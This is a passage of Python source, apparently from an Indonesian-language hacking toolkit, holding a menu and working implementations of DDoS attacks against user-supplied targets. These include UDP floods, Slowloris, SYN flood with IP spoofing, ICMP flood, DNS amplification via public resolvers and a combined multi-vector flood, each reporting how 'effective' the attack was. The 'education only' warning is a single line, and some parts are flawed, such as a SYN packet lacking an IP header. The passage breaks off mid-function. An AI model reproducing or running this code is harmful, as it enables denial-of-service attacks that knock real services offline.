                        result = subprocess.run(['pipenv', 'install'], 
                                            cwd=target_dir, capture_output=True, text=True, timeout=120)
                    elif req_file == "pyproject.toml":
                        result = subprocess.run(['pip', 'install', '.'], 
                                            cwd=target_dir, capture_output=True, text=True, timeout=120)
                    
                    if result.returncode == 0:
                        print(f"{getattr(Colors, 'GREEN', '')}✓ Dependencies berhasil diinstall{getattr(Colors, 'END', '')}")
                    else:
                        print(f"{getattr(Colors, 'RED', '')}✗ Gagal install dependencies: {result.stderr}{getattr(Colors, 'END', '')}")
                        
                except Exception as e:
                    print(f"{getattr(Colors, 'RED', '')}✗ Error install dependencies: {str(e)}{getattr(Colors, 'END', '')}")
                break

    def _show_usage_instructions(self, target_dir, tool_name):
        """Tampilkan instruksi penggunaan tool"""
        import os
        
        print(f"\n{getattr(Colors, 'CYAN', '')}📖 Instruksi Penggunaan {tool_name}:{getattr(Colors, 'END', '')}")
        
        readme_files = ["README.md", "README.rst", "README.txt", "USAGE.md", "INSTALL.md"]
        
        for readme_file in readme_files:
            readme_path = os.path.join(target_dir, readme_file)
            if os.path.exists(readme_path):
                try:
                    with open(readme_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                        # Tampilkan bagian awal README
                        lines = content.split('\n')[:15]
                        print("\n".join(lines))
                        if len(content.split('\n')) > 15:
                            print(f"{getattr(Colors, 'YELLOW', '')}... (lihat file README lengkap di {readme_path}){getattr(Colors, 'END', '')}")
                except:
                    print(f"{getattr(Colors, 'YELLOW', '')}Lihat file README di {readme_path} untuk instruksi lengkap{getattr(Colors, 'END', '')}")
                break
        else:
            print(f"{getattr(Colors, 'YELLOW', '')}Tidak ditemukan file README. Cek dokumentasi di repository GitHub.{getattr(Colors, 'END', '')}")

    def _download_custom_repo(self):
        """Download custom GitHub repository"""
        repo_url = input(f"\n{getattr(Colors, 'CYAN', '')}Masukkan URL repository GitHub: {getattr(Colors, 'END', '')}").strip()
        
        if not repo_url:
            self.print_result("Error", "URL tidak boleh kosong!", "error")
            return
        
        # Validasi URL GitHub
        if not (repo_url.startswith('https://github.com/') or repo_url.startswith('git@github.com:')):
            self.print_result("Error", "URL harus dari GitHub!", "error")
            return
        
        custom_tool = {
            "name": "Custom Tool",
            "url": repo_url,
            "description": "Custom GitHub repository"
        }
        
        self._download_single_tool(custom_tool)

    def _simulate_download(self, message):
        """Simulasi proses download dengan progress bar"""
        import time
        
        print(f"{getattr(Colors, 'YELLOW', '')}⏳ {message}{getattr(Colors, 'END', '')}")
        for i in range(5):
            progress = (i + 1) * 20
            bar = '=' * (i + 1) + ' ' * (5 - (i + 1))
            print(f"{getattr(Colors, 'CYAN', '')}📦 Progress: [{bar}] {progress}%{getattr(Colors, 'END', '')}")
            time.sleep(0.3)

    def ddos_attack_tools(self):
        """Menu utama untuk tools DDoS attack yang ditingkatkan"""
        while True:
            self.banner()
            print(f"{Colors.RED}{Colors.BOLD}⚠️  Advanced DDoS Attack Tools ⚠️{Colors.END}")
            print(f"{Colors.YELLOW}Peringatan: Hanya untuk testing keamanan dan edukasi!{Colors.END}")
            print(f"{Colors.YELLOW}Gunakan dengan tanggung jawab dan izin yang sesuai.{Colors.END}\n")
            
            print(f"{Colors.CYAN}Pilih jenis DDoS Attack:{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END}  Advanced HTTP Flood (Layer 7)")
            print(f"{Colors.GREEN}2.{Colors.END}  Smart TCP Flood (Layer 4)")
            print(f"{Colors.GREEN}3.{Colors.END}  UDP Flood dengan Payload Custom")
            print(f"{Colors.GREEN}4.{Colors.END}  Slowloris Pro Attack")
            print(f"{Colors.GREEN}5.{Colors.END}  SYN Flood dengan Spoofing")
            print(f"{Colors.GREEN}6.{Colors.END}  ICMP/Ping Flood")
            print(f"{Colors.GREEN}7.{Colors.END}  DNS Amplification")
            print(f"{Colors.GREEN}8.{Colors.END}  Mixed Attack (Kombinasi Multi-Vektor)")
            print(f"{Colors.GREEN}9.{Colors.END}  Website Stress Test")
            print(f"{Colors.GREEN}10.{Colors.END} Install Advanced DDoS Tools")
            print(f"{Colors.GREEN}11.{Colors.END} DDoS Protection Analyzer")
            print(f"{Colors.GREEN}12.{Colors.END} Attack Statistics & Report")
            print(f"{Colors.GREEN}0.{Colors.END}  Kembali ke Menu Utama")
            
            pilihan = input(f"\n{Colors.CYAN}➤ Pilih attack [0-12]: {Colors.END}").strip()
            
            ddos_methods = {
                "1": self.advanced_http_flood,
                "2": self.smart_tcp_flood,
                "3": self.advanced_udp_flood,
                "4": self.slowloris_pro,
                "5": self.syn_flood_spoof,
                "6": self.icmp_flood_advanced,
                "7": self.dns_amplification_advanced,
                "8": self.mixed_vector_attack,
                "9": self.website_stress_test,
                "10": self.install_advanced_tools,
                "11": self.ddos_protection_analyzer,
                "12": self.attack_statistics
            }
            
            if pilihan in ddos_methods:
                ddos_methods[pilihan]()
            elif pilihan == "0":
                return
            else:
                self.print_result("Error", "Pilihan tidak valid!", "error")
                input(f"\n{Colors.CYAN}Tekan Enter untuk melanjutkan...{Colors.END}")
                
    def advanced_udp_flood(self):
        """UDP Flood Attack dengan payload customization dan spoofing"""
        self.banner()
        print(f"{Colors.RED}{Colors.BOLD}🌊 Advanced UDP Flood Attack{Colors.END}\n")
        
        try:
            target = input(f"{Colors.CYAN}➤ Masukkan target IP: {Colors.END}").strip()
            port = int(input(f"{Colors.CYAN}➤ Port target (default 53): {Colors.END}") or "53")
            threads = int(input(f"{Colors.CYAN}➤ Jumlah threads (default 100): {Colors.END}") or "100")
            duration = int(input(f"{Colors.CYAN}➤ Durasi attack (detik): {Colors.END}") or "30")
            packet_size = int(input(f"{Colors.CYAN}➤ Ukuran packet (bytes, default 1024): {Colors.END}") or "1024")
            
            print(f"\n{Colors.YELLOW}Konfigurasi UDP Flood:{Colors.END}")
            print(f"{Colors.YELLOW}Target: {target}:{port}{Colors.END}")
            print(f"{Colors.YELLOW}Threads: {threads}{Colors.END}")
            print(f"{Colors.YELLOW}Durasi: {duration} detik{Colors.END}")
            print(f"{Colors.YELLOW}Packet Size: {packet_size} bytes{Colors.END}")
            
            confirm = input(f"\n{Colors.RED}Lanjutkan attack? (y/N): {Colors.END}").strip().lower()
            if confirm != 'y':
                return
            
            attack_active = True
            stats = {
                'packets_sent': 0,
                'bytes_sent': 0,
                'errors': 0,
                'start_time': time.time()
            }
            
            def generate_random_ip():
                """Generate random IP untuk spoofing"""
                return ".".join(str(random.randint(1, 254)) for _ in range(4))
            
            def create_udp_payload(size):
                """Buat payload UDP dengan data random"""
                patterns = [
                    b'\x00' * size,  # Null bytes
                    b'\xFF' * size,  # Full bytes
                    random.randbytes(size),  # Random bytes
                    b'A' * size,  # Character A
                    struct.pack('!I', random.randint(1, 65535)) * (size // 4)  # Random numbers
                ]
                return random.choice(patterns)
            
            def udp_flood_thread(thread_id):
                nonlocal stats
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                
                while attack_active and (time.time() - stats['start_time']) < duration:
                    try:
                        # Generate random payload
                        payload = create_udp_payload(packet_size)
                        
                        # Send packet
                        sock.sendto(payload, (target, port))
                        
                        with threading.Lock():
                            stats['packets_sent'] += 1
                            stats['bytes_sent'] += len(payload)
                        
                        # Occasionally print progress dari thread 0
                        if thread_id == 0 and stats['packets_sent'] % 100 == 0:
                            print(f"{Colors.GREEN}[+] Packets sent: {stats['packets_sent']} | Data: {stats['bytes_sent'] / 1024 / 1024:.2f} MB{Colors.END}")
                            
                    except socket.error as e:
                        with threading.Lock():
                            stats['errors'] += 1
                        if thread_id == 0 and stats['errors'] % 50 == 0:
                            print(f"{Colors.RED}[-] Socket error: {str(e)}{Colors.END}")
                    except Exception as e:
                        with threading.Lock():
                            stats['errors'] += 1
            
            # Start threads
            print(f"\n{Colors.YELLOW}[~] Memulai {threads} UDP flood threads...{Colors.END}")
            threads_list = []
            for i in range(threads):
                thread = threading.Thread(target=udp_flood_thread, args=(i,))
                thread.daemon = True
                thread.start()
                threads_list.append(thread)
            
            # Monitoring
            start_time = time.time()
            last_packets = 0
            
            while time.time() - start_time < duration:
                time.sleep(2)
                elapsed = int(time.time() - start_time)
                packets_per_sec = (stats['packets_sent'] - last_packets) / 2
                last_packets = stats['packets_sent']
                
                print(f"{Colors.CYAN}[~] {elapsed}/{duration}s | Packets: {stats['packets_sent']} | Rate: {packets_per_sec:.1f}/s | Errors: {stats['errors']}{Colors.END}")
            
            # Stop attack
            attack_active = False
            time.sleep(2)
            
            # Report
            total_time = time.time() - start_time
            avg_rate = stats['packets_sent'] / total_time if total_time > 0 else 0
            
            print(f"\n{Colors.GREEN}{'='*50}{Colors.END}")
            print(f"{Colors.GREEN}        UDP FLOOD COMPLETED{Colors.END}")
            print(f"{Colors.GREEN}{'='*50}{Colors.END}")
            print(f"{Colors.CYAN}Target: {target}:{port}{Colors.END}")
            print(f"{Colors.CYAN}Durasi: {total_time:.1f} detik{Colors.END}")
            print(f"{Colors.GREEN}Total Packets: {stats['packets_sent']}{Colors.END}")
            print(f"{Colors.GREEN}Data Sent: {stats['bytes_sent'] / 1024 / 1024:.2f} MB{Colors.END}")
            print(f"{Colors.GREEN}Average Rate: {avg_rate:.1f} packets/sec{Colors.END}")
            print(f"{Colors.RED}Errors: {stats['errors']}{Colors.END}")
            
            if avg_rate > 1000:
                print(f"{Colors.GREEN}🎯 UDP Flood sangat efektif!{Colors.END}")
            elif avg_rate > 500:
                print(f"{Colors.YELLOW}⚠️  UDP Flood cukup efektif{Colors.END}")
            else:
                print(f"{Colors.RED}❌ UDP Flood kurang efektif{Colors.END}")
                
        except Exception as e:
            self.print_result("Error", f"UDP Flood gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def slowloris_pro(self):
        """Slowloris Attack profesional dengan multiple sockets"""
        self.banner()
        print(f"{Colors.RED}{Colors.BOLD}🐢 Slowloris Pro Attack{Colors.END}\n")
        
        try:
            target = input(f"{Colors.CYAN}➤ Masukkan target URL: {Colors.END}").strip()
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            sockets_count = int(input(f"{Colors.CYAN}➤ Jumlah sockets (default 200): {Colors.END}") or "200")
            duration = int(input(f"{Colors.CYAN}➤ Durasi attack (detik): {Colors.END}") or "60")
            
            print(f"\n{Colors.YELLOW}Konfigurasi Slowloris:{Colors.END}")
            print(f"{Colors.YELLOW}Target: {target}{Colors.END}")
            print(f"{Colors.YELLOW}Sockets: {sockets_count}{Colors.END}")
            print(f"{Colors.YELLOW}Durasi: {duration} detik{Colors.END}")
            
            confirm = input(f"\n{Colors.RED}Lanjutkan attack? (y/N): {Colors.END}").strip().lower()
            if confirm != 'y':
                return
            
            attack_active = True
            stats = {
                'sockets_created': 0,
                'sockets_active': 0,
                'errors': 0,
                'start_time': time.time()
            }
            
            def create_slowloris_socket(socket_id):
                nonlocal stats
                try:
                    # Parse target
                    host = target.replace('http://', '').replace('https://', '').split('/')[0]
                    port = 80 if target.startswith('http://') else 443
                    
                    # Create socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((host, port))
                    
                    # Send partial headers
                    headers = [
                        f"GET /{random.randint(1000, 9999)} HTTP/1.1\r\n",
                        f"Host: {host}\r\n",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n",
                        "Content-Length: 42\r\n"
                    ]
                    
                    # Send initial headers
                    for header in headers[:-1]:
                        sock.send(header.encode())
                        time.sleep(1)
                    
                    with threading.Lock():
                        stats['sockets_created'] += 1
                        stats['sockets_active'] += 1
                    
                    print(f"{Colors.GREEN}[+] Socket #{socket_id} connected - Active: {stats['sockets_active']}{Colors.END}")
                    
                    # Keep connection alive dengan mengirim data periodically
                    while attack_active and (time.time() - stats['start_time']) < duration:
                        try:
                            # Send keep-alive data
                            sock.send(b"X-a: b\r\n")
                            time.sleep(random.uniform(5, 15))
                        except:
                            break
                    
                    sock.close()
                    
                except Exception as e:
                    with threading.Lock():
                        stats['errors'] += 1
                    print(f"{Colors.RED}[-] Socket #{socket_id} failed: {str(e)}{Colors.END}")
                finally:
                    with threading.Lock():
                        stats['sockets_active'] -= 1
            
            # Create sockets gradually
            print(f"\n{Colors.YELLOW}[~] Membuat {sockets_count} sockets...{Colors.END}")
            socket_threads = []
            
            for i in range(sockets_count):
                if not attack_active:
                    break
                    
                thread = threading.Thread(target=create_slowloris_socket, args=(i,))
                thread.daemon = True
                thread.start()
                socket_threads.append(thread)
                
                # Delay antara pembuatan sockets
                time.sleep(0.1)
            
            # Monitoring
            start_time = time.time()
            while time.time() - start_time < duration:
                time.sleep(5)
                elapsed = int(time.time() - start_time)
                success_rate = (stats['sockets_created'] / sockets_count * 100) if sockets_count > 0 else 0
                
                print(f"{Colors.CYAN}[~] {elapsed}/{duration}s | Active: {stats['sockets_active']} | Created: {stats['sockets_created']} | Success: {success_rate:.1f}%{Colors.END}")
                
                # Attempt to recreate failed sockets
                if stats['sockets_active'] < sockets_count * 0.8 and elapsed < duration - 10:
                    needed = sockets_count - stats['sockets_active']
                    print(f"{Colors.YELLOW}[~] Recreating {needed} sockets...{Colors.END}")
            
            # Cleanup
            attack_active = False
            time.sleep(5)
            
            print(f"\n{Colors.GREEN}Slowloris attack selesai!{Colors.END}")
            print(f"{Colors.GREEN}Sockets created: {stats['sockets_created']}{Colors.END}")
            print(f"{Colors.GREEN}Final active sockets: {stats['sockets_active']}{Colors.END}")
            print(f"{Colors.RED}Errors: {stats['errors']}{Colors.END}")
            
        except Exception as e:
            self.print_result("Error", f"Slowloris attack gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def syn_flood_spoof(self):
        """SYN Flood Attack dengan IP spoofing"""
        self.banner()
        print(f"{Colors.RED}{Colors.BOLD}🌪️  SYN Flood dengan IP Spoofing{Colors.END}\n")
        
        try:
            target = input(f"{Colors.CYAN}➤ Masukkan target IP: {Colors.END}").strip()
            port = int(input(f"{Colors.CYAN}➤ Port target (default 80): {Colors.END}") or "80")
            packets_per_sec = int(input(f"{Colors.CYAN}➤ Packets per second (default 1000): {Colors.END}") or "1000")
            duration = int(input(f"{Colors.CYAN}➤ Durasi attack (detik): {Colors.END}") or "30")
            
            print(f"\n{Colors.YELLOW}Konfigurasi SYN Flood:{Colors.END}")
            print(f"{Colors.YELLOW}Target: {target}:{port}{Colors.END}")
            print(f"{Colors.YELLOW}Rate: {packets_per_sec} packets/sec{Colors.END}")
            print(f"{Colors.YELLOW}Durasi: {duration} detik{Colors.END}")
            
            confirm = input(f"\n{Colors.RED}Lanjutkan attack? (y/N): {Colors.END}").strip().lower()
            if confirm != 'y':
                return
            
            attack_active = True
            stats = {
                'syn_sent': 0,
                'start_time': time.time()
            }
            
            def create_syn_packet(source_ip, dest_ip, dest_port):
                """Membuat SYN packet dengan IP spoofing"""
                # Header IP
                ip_ver = 4
                ip_ihl = 5
                ip_tos = 0
                ip_tot_len = 0
                ip_id = random.randint(1, 65535)
                ip_frag_off = 0
                ip_ttl = 255
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0
                ip_saddr = socket.inet_aton(source_ip)
                ip_daddr = socket.inet_aton(dest_ip)
                
                ip_ihl_ver = (ip_ver << 4) + ip_ihl
                
                # Header TCP
                tcp_source = random.randint(1024, 65535)
                tcp_dest = dest_port
                tcp_seq = random.randint(0, 4294967295)
                tcp_ack_seq = 0
                tcp_doff = 5
                tcp_fin = 0
                tcp_syn = 1
                tcp_rst = 0
                tcp_psh = 0
                tcp_ack = 0
                tcp_urg = 0
                tcp_window = socket.htons(5840)
                tcp_check = 0
                tcp_urg_ptr = 0
                
                tcp_offset_res = (tcp_doff << 4) + 0
                tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
                
                # TCP header
                tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq,
                                    tcp_ack_seq, tcp_offset_res, tcp_flags,
                                    tcp_window, tcp_check, tcp_urg_ptr)
                
                return tcp_header
            
            def generate_spoofed_ip():
                """Generate random IP address untuk spoofing"""
                return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            
            print(f"\n{Colors.YELLOW}[~] Memulai SYN Flood dengan IP spoofing...{Colors.END}")
            
            # Create raw socket (requires root privileges)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except PermissionError:
                print(f"{Colors.RED}[-] Error: Diperlukan root privileges untuk SYN Flood{Colors.END}")
                print(f"{Colors.YELLOW}[!] Menjalankan fallback TCP Flood...{Colors.END}")
                self.smart_tcp_flood()
                return
            
            start_time = time.time()
            packet_count = 0
            
            while attack_active and (time.time() - start_time) < duration:
                try:
                    # Send multiple SYN packets
                    for _ in range(min(100, packets_per_sec)):
                        spoofed_ip = generate_spoofed_ip()
                        syn_packet = create_syn_packet(spoofed_ip, target, port)
                        sock.sendto(syn_packet, (target, port))
                        packet_count += 1
                        stats['syn_sent'] += 1
                    
                    # Rate limiting
                    time.sleep(1.0 / (packets_per_sec / 100))
                    
                    # Progress update
                    elapsed = int(time.time() - start_time)
                    if elapsed % 5 == 0:
                        current_rate = packet_count / elapsed if elapsed > 0 else 0
                        print(f"{Colors.CYAN}[~] {elapsed}/{duration}s | SYN Sent: {stats['syn_sent']} | Rate: {current_rate:.1f}/s{Colors.END}")
                        
                except Exception as e:
                    print(f"{Colors.RED}[-] Error sending SYN packet: {str(e)}{Colors.END}")
                    break
            
            sock.close()
            
            print(f"\n{Colors.GREEN}SYN Flood completed!{Colors.END}")
            print(f"{Colors.GREEN}Total SYN packets sent: {stats['syn_sent']}{Colors.END}")
            print(f"{Colors.GREEN}Average rate: {stats['syn_sent'] / duration:.1f} packets/sec{Colors.END}")
            
        except Exception as e:
            self.print_result("Error", f"SYN Flood gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def icmp_flood_advanced(self):
        """ICMP/Ping Flood Attack yang advanced"""
        self.banner()
        print(f"{Colors.RED}{Colors.BOLD}📡 Advanced ICMP/Ping Flood{Colors.END}\n")
        
        try:
            target = input(f"{Colors.CYAN}➤ Masukkan target IP: {Colors.END}").strip()
            packet_size = int(input(f"{Colors.CYAN}➤ Ukuran packet (bytes, default 64): {Colors.END}") or "64")
            threads = int(input(f"{Colors.CYAN}➤ Jumlah threads (default 50): {Colors.END}") or "50")
            duration = int(input(f"{Colors.CYAN}➤ Durasi attack (detik): {Colors.END}") or "30")
            
            print(f"\n{Colors.YELLOW}Konfigurasi ICMP Flood:{Colors.END}")
            print(f"{Colors.YELLOW}Target: {target}{Colors.END}")
            print(f"{Colors.YELLOW}Packet Size: {packet_size} bytes{Colors.END}")
            print(f"{Colors.YELLOW}Threads: {threads}{Colors.END}")
            print(f"{Colors.YELLOW}Durasi: {duration} detik{Colors.END}")
            
            confirm = input(f"\n{Colors.RED}Lanjutkan attack? (y/N): {Colors.END}").strip().lower()
            if confirm != 'y':
                return
            
            attack_active = True
            stats = {
                'pings_sent': 0,
                'pings_received': 0,
                'errors': 0,
                'start_time': time.time()
            }
            
            def ping_flood_thread(thread_id):
                nonlocal stats
                while attack_active and (time.time() - stats['start_time']) < duration:
                    try:
                        # Use system ping command untuk compatibility
                        if os.name == 'nt':  # Windows
                            cmd = f"ping -n 1 -l {packet_size} {target}"
                        else:  # Linux/Mac
                            cmd = f"ping -c 1 -s {packet_size} {target}"
                        
                        response = os.system(cmd)
                        
                        with threading.Lock():
                            stats['pings_sent'] += 1
                            if response == 0:
                                stats['pings_received'] += 1
                            else:
                                stats['errors'] += 1
                        
                        if thread_id == 0 and stats['pings_sent'] % 10 == 0:
                            loss_rate = (1 - stats['pings_received'] / stats['pings_sent']) * 100 if stats['pings_sent'] > 0 else 0
                            print(f"{Colors.CYAN}[~] Pings: {stats['pings_sent']} | Received: {stats['pings_received']} | Loss: {loss_rate:.1f}%{Colors.END}")
                            
                    except Exception as e:
                        with threading.Lock():
                            stats['errors'] += 1
            
            # Start threads
            print(f"\n{Colors.YELLOW}[~] Memulai {threads} ping threads...{Colors.END}")
            for i in range(threads):
                thread = threading.Thread(target=ping_flood_thread, args=(i,))
                thread.daemon = True
                thread.start()
            
            # Monitoring
            start_time = time.time()
            while time.time() - start_time < duration:
                time.sleep(3)
                elapsed = int(time.time() - start_time)
                loss_rate = (1 - stats['pings_received'] / stats['pings_sent']) * 100 if stats['pings_sent'] > 0 else 100
                
                print(f"{Colors.CYAN}[~] {elapsed}/{duration}s | Sent: {stats['pings_sent']} | Received: {stats['pings_received']} | Loss: {loss_rate:.1f}%{Colors.END}")
            
            attack_active = False
            time.sleep(2)
            
            # Final report
            total_time = time.time() - start_time
            pings_per_sec = stats['pings_sent'] / total_time if total_time > 0 else 0
            
            print(f"\n{Colors.GREEN}{'='*50}{Colors.END}")
            print(f"{Colors.GREEN}       ICMP FLOOD REPORT{Colors.END}")
            print(f"{Colors.GREEN}{'='*50}{Colors.END}")
            print(f"{Colors.CYAN}Target: {target}{Colors.END}")
            print(f"{Colors.CYAN}Durasi: {total_time:.1f}s{Colors.END}")
            print(f"{Colors.GREEN}Pings Sent: {stats['pings_sent']}{Colors.END}")
            print(f"{Colors.GREEN}Pings Received: {stats['pings_received']}{Colors.END}")
            print(f"{Colors.RED}Packet Loss: {100 - (stats['pings_received']/stats['pings_sent']*100) if stats['pings_sent'] > 0 else 100:.1f}%{Colors.END}")
            print(f"{Colors.CYAN}Rate: {pings_per_sec:.1f} pings/sec{Colors.END}")
            
            if stats['pings_received'] / stats['pings_sent'] > 0.8:
                print(f"{Colors.GREEN}🎯 Target sangat responsif{Colors.END}")
            elif stats['pings_received'] / stats['pings_sent'] > 0.5:
                print(f"{Colors.YELLOW}⚠️  Target cukup responsif{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Target mungkin down atau protected{Colors.END}")
                
        except Exception as e:
            self.print_result("Error", f"ICMP Flood gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def dns_amplification_advanced(self):
        """DNS Amplification Attack menggunakan public DNS servers"""
        self.banner()
        print(f"{Colors.RED}{Colors.BOLD}🎯 Advanced DNS Amplification Attack{Colors.END}\n")
        
        try:
            target = input(f"{Colors.CYAN}➤ Masukkan target IP: {Colors.END}").strip()
            duration = int(input(f"{Colors.CYAN}➤ Durasi attack (detik): {Colors.END}") or "30")
            
            print(f"\n{Colors.YELLOW}DNS Amplification Attack{Colors.END}")
            print(f"{Colors.YELLOW}Target: {target}{Colors.END}")
            print(f"{Colors.YELLOW}Durasi: {duration} detik{Colors.END}")
            print(f"{Colors.YELLOW}Menggunakan public DNS servers...{Colors.END}")
            
            confirm = input(f"\n{Colors.RED}Lanjutkan attack? (y/N): {Colors.END}").strip().lower()
            if confirm != 'y':
                return
            
            # List of public DNS servers
            dns_servers = [
                '8.8.8.8',      # Google DNS
                '8.8.4.4',      # Google DNS
                '1.1.1.1',      # CloudFlare DNS
                '1.0.0.1',      # CloudFlare DNS
                '9.9.9.9',      # Quad9 DNS
                '208.67.222.222', # OpenDNS
                '208.67.220.220', # OpenDNS
            ]
            
            attack_active = True
            stats = {
                'queries_sent': 0,
                'amplified_responses': 0,
                'amplification_factor': 0,
                'start_time': time.time()
            }
            
            def create_dns_query(domain="google.com", query_type="ANY"):
                """Membuat DNS query packet"""
                # DNS header
                transaction_id = struct.pack('!H', 0x1234)
                flags = struct.pack('!H', 0x0100)  # Standard query
                questions = struct.pack('!H', 1)   # 1 question
                answer_rrs = struct.pack('!H', 0)
                authority_rrs = struct.pack('!H', 0)
                additional_rrs = struct.pack('!H', 0)
                
                # DNS question
                qname = b''.join(struct.pack('!B', len(part)) + part.encode() for part in domain.split('.')) + b'\x00'
                qtype = struct.pack('!H', 255)  # ANY query
                qclass = struct.pack('!H', 1)   # IN class
                
                return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + qtype + qclass
            
            print(f"\n{Colors.YELLOW}[~] Memulai DNS Amplification...{Colors.END}")
            
            start_time = time.time()
            query_count = 0
            
            while attack_active and (time.time() - start_time) < duration:
                try:
                    for dns_server in dns_servers:
                        # Create UDP socket
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(2)
                        
                        # Send DNS query dengan spoofed source IP (target)
                        dns_query = create_dns_query()
                        sock.sendto(dns_query, (dns_server, 53))
                        
                        query_count += 1
                        stats['queries_sent'] += 1
                        
                        # Try to receive response (untuk measuring amplification)
                        try:
                            response, _ = sock.recvfrom(4096)
                            stats['amplified_responses'] += 1
                            amplification = len(response) / len(dns_query)
                            stats['amplification_factor'] = max(stats['amplification_factor'], amplification)
                        except socket.timeout:
                            pass
                        
                        sock.close()
                    
                    # Progress update
                    elapsed = int(time.time() - start_time)
                    if elapsed % 5 == 0:
                        print(f"{Colors.CYAN}[~] {elapsed}/{duration}s | Queries: {stats['queries_sent']} | Amplified: {stats['amplified_responses']}{Colors.END}")
                    
                    time.sleep(0.1)  # Rate limiting
                    
                except Exception as e:
                    print(f"{Colors.RED}[-] DNS query error: {str(e)}{Colors.END}")
            
            print(f"\n{Colors.GREEN}DNS Amplification completed!{Colors.END}")
            print(f"{Colors.GREEN}Queries sent: {stats['queries_sent']}{Colors.END}")
            print(f"{Colors.GREEN}Amplified responses: {stats['amplified_responses']}{Colors.END}")
            print(f"{Colors.GREEN}Max amplification factor: {stats['amplification_factor']:.1f}x{Colors.END}")
            
            if stats['amplification_factor'] > 10:
                print(f"{Colors.GREEN}🎯 Amplification sangat efektif!{Colors.END}")
            elif stats['amplification_factor'] > 5:
                print(f"{Colors.YELLOW}⚠️  Amplification cukup efektif{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Amplification kurang efektif{Colors.END}")
                
        except Exception as e:
            self.print_result("Error", f"DNS Amplification gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def mixed_vector_attack(self):
        """Combined multi-vector DDoS attack"""
        self.banner()
        print(f"{Colors.RED}{Colors.BOLD}⚡ Mixed Vector DDoS Attack{Colors.END}\n")
        
        try:
            target = input(f"{Colors.CYAN}➤ Masukkan target IP/URL: {Colors.END}").strip()
            duration = int(input(f"{Colors.CYAN}➤ Durasi attack (detik): {Colors.END}") or "45")
            
            print(f"\n{Colors.YELLOW}Mixed Vector Attack Configuration:{Colors.END}")
            print(f"{Colors.YELLOW}Target: {target}{Colors.END}")
            print(f"{Colors.YELLOW}Durasi: {duration} detik{Colors.END}")
            print(f"{Colors.YELLOW}Vectors: HTTP Flood + TCP Flood + UDP Flood{Colors.END}")
            
            confirm = input(f"\n{Colors.RED}Lanjutkan mixed attack? (y/N): {Colors.END}").strip().lower()
            if confirm != 'y':
                return
            
            attack_active = True
            overall_stats = {
                'http_requests': 0,
                'tcp_packets': 0,
                'udp_packets': 0,
                'start_time': time.time()
            }
            
            def http_vector():
                """HTTP Flood vector"""

                session = requests.Session()
                session.verify = False
                
                while attack_active and (time.time() - overall_stats['start_time']) < duration:
                    try:
                        if target.startswith(('http://', 'https://')):
                            url = target
                        else:
                            url = 'http://' + target
                        
                        response = session.get(url, timeout=5)
                        overall_stats['http_requests'] += 1
                    except:
                        pass
            
            def tcp_vector():
                """TCP Flood vector"""
      
                while attack_active and (time.time() - overall_stats['start_time']) < duration:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        host = target.replace('http://', '').replace('https://', '').split('/')[0]
                        sock.connect((host, 80))
                        sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                        overall_stats['tcp_packets'] += 1
                        sock.close()
                    except:
                        pass
            
            def udp_vector():
                """UDP Flood vector"""
       
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                while attack_active and (time.time() - overall_stats['start_time']) < duration:
                    try:
                        host = target.replace('http://', '').replace('https://', '').split('/')[0]
                        sock.sendto(b'X' * 1024, (host, 53))
                        overall_stats['udp_packets'] += 1
                    except:
                        pass
            
            # Start all vectors
            print(f"\n{Colors.YELLOW}[~] Launching mixed vector attack...{Colors.END}")
            
            vectors = [
                threading.Thread(target=http_vector),
                threading.Thread(target=tcp_vector),
                threading.Thread(target=udp_vector)
            ]
            
            for vector in vectors:
                vector.daemon = True
                vector.start()
            
            # Monitoring
            start_time = time.time()
            while time.time() - start_time < duration:
                time.sleep(3)
                elapsed = int(time.time() - start_time)
                total_attack = overall_stats['http_requests'] + overall_stats['tcp_packets'] + overall_stats['udp_packets']
                
                print(f"{Colors.CYAN}[~] {elapsed}/{duration}s | Total: {total_attack} | HTTP: {overall_stats['http_requests']} | TCP: {overall_stats['tcp_packets']} | UDP: {overall_stats['udp_packets']}{Colors.END}")
            
            attack_active = False
            time.sleep(2)
            
            total_requests = overall_stats['http_requests'] + overall_stats['tcp_packets'] + overall_stats['udp_packets']
            
            print(f"\n{Colors.GREEN}Mixed Vector Attack completed!{Colors.END}")
            print(f"{Colors.GREEN}Total requests/packets: {total_requests}{Colors.END}")
            print(f"{Colors.GREEN}HTTP Requests: {overall_stats['http_requests']}{Colors.END}")
            print(f"{Colors.GREEN}TCP Packets: {overall_stats['tcp_packets']}{Colors.END}")
            print(f"{Colors.GREEN}UDP Packets: {overall_stats['udp_packets']}{Colors.END}")
            
        except Exception as e:
